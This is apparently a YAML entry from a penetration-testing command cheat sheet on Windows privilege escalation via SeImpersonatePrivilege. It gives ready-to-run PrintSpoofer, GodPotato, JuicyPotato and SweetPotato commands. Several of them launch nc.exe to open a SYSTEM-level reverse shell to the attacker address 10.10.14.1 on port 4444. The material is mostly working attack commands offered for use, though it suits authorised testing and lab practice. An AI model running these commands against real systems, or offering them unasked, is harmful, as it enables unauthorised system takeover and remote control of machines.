---
description: |
  Windows privilege escalation from service accounts using
  SeImpersonatePrivilege (JuicyPotato, PrintSpoofer, GodPotato).

  Reference values:
    Attacker IP: 10.10.14.1
command: |
  # Check for SeImpersonate
  whoami /priv

  # PrintSpoofer (Windows 10/Server 2019)
  .\PrintSpoofer.exe -i -c "cmd /c whoami"
  .\PrintSpoofer.exe -c "C:\Temp\nc.exe 10.10.14.1 4444 -e cmd.exe"

  # GodPotato (works on newer Windows)
  .\GodPotato.exe -cmd "cmd /c whoami"
  .\GodPotato.exe -cmd "C:\Temp\nc.exe 10.10.14.1 4444 -e cmd.exe"

  # JuicyPotato (older Windows)
  .\JuicyPotato.exe -l 1337 -p C:\Temp\nc.exe -a "10.10.14.1 4444 -e cmd.exe" -t *

  # SweetPotato
  .\SweetPotato.exe -e EfsRpc -p C:\Temp\nc.exe -a "10.10.14.1 4444 -e cmd.exe"
phase:
  - PrivEsc
target_os:
  - Windows
services: []
items:
  - Shell
techniques:
  - Token_Impersonation
network_position:
  - Local
references:
  - https://github.com/itm4n/PrintSpoofer
  - https://github.com/BeichenDream/GodPotato
---
